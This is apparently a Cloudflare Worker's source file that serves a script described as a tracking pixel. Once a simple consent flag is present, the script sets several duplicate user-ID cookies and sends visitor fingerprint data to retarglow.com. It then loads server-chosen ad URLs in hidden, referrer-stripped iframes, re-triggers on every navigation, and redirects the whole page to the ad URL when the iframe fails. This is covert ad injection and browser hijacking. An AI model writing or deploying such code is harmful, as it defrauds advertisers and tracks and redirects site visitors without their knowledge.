export default {
  async fetch(request) {
    const headers = {
      "Content-Type": "application/javascript",
      "Access-Control-Allow-Origin": "*"
    };

    const js = `(function(){
  try {
    const waitForConsent = () => {
      const hasConsent =
        document.cookie.includes("consent=true") ||
        window.CookieConsentAccepted === true ||
        window.__cookieConsentAccepted === true;

      if (!hasConsent) return setTimeout(waitForConsent, 1000);

      // Pixel logic starts here after consent granted
      const _r = localStorage.getItem("_r") || crypto.randomUUID();
      localStorage.setItem("_r", _r);
      document.cookie = "_r=" + _r + ";path=/;max-age=2592000;SameSite=Lax";
      document.cookie = "smc_uid=" + _r + ";path=/;max-age=31536000;SameSite=Lax";
      document.cookie = "user_id_t=" + _r + ";path=/;max-age=31536000;SameSite=Lax";

      const u = location.href, r = document.referrer, n = navigator.userAgent;
      const b = n.includes("Chrome") ? "C" : n.includes("Firefox") ? "F" : n.includes("Safari") ? "S" : "U";
      const d = /Mobi|Android/i.test(n) ? "M" : "D";
      const o = navigator.platform;
      const s = screen.width + "x" + screen.height;
      const domain = location.hostname;

      const p = { cid: "default", u, r, ua: n, dt: d, b, os: o, sr: s, cm: { _r }, domain };

      fetch("https://retarglow.com/log", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(p)
      });

      let triggered = false;
      const sessionKey = "i_" + _r + "_" + location.pathname;
      const once = sessionStorage.getItem(sessionKey);

      const inject = () => {
        if (triggered || once) return;
        triggered = true;
        sessionStorage.setItem(sessionKey, "1");

        fetch("https://retarglow.com/serve", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ u, cm: { _r } })
        })
        .then(res => res.json())
        .then(j => {
          if (!j.ad_url) return;
          const cid = j.cid || "default";

          fetch("https://retarglow.com/log", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ cid, event: "adInjectAttempt", u, cm: { _r }, ad_url: j.ad_url })
          }).catch(() => {});

          const f = document.createElement("iframe");
          f.style.display = "none";
          f.referrerPolicy = "no-referrer";
          f.src = j.ad_url;

          f.onload = () => {
            fetch("https://retarglow.com/log", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ cid, event: "iframeLoaded", u, cm: { _r }, ad_url: j.ad_url })
            });
          };

          f.onerror = () => {
            const img = new Image();
            img.src = j.ad_url;
            fetch("https://retarglow.com/log", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ cid, event: "iframeFailed_beaconFallback", u, cm: { _r }, ad_url: j.ad_url })
            }).finally(() => {
              setTimeout(() => {
                window.location.href = j.ad_url;
              }, 300);
            });
          };

          document.body.appendChild(f);
        });
      };

      setTimeout(inject, 2000);
      window.addEventListener("scroll", () => { inject(); window.removeEventListener("scroll", inject); });
      setTimeout(inject, 5000);

      ["pushState", "replaceState"].forEach(fn => {
        const orig = history[fn];
        history[fn] = function () {
          const r = orig.apply(this, arguments);
          triggered = false;
          setTimeout(inject, 1500);
          return r;
        };
      });

      window.addEventListener("popstate", () => {
        triggered = false;
        setTimeout(inject, 1500);
      });

      let lastUrl = location.href;
      const mo = new MutationObserver(() => {
        if (location.href !== lastUrl) {
          lastUrl = location.href;
          triggered = false;
          setTimeout(inject, 1500);
        }
      });
      mo.observe(document, { childList: true, subtree: true });
    };

    waitForConsent();
  } catch (e) {}
})();`;

    return new Response(js, { status: 200, headers });
  }
}
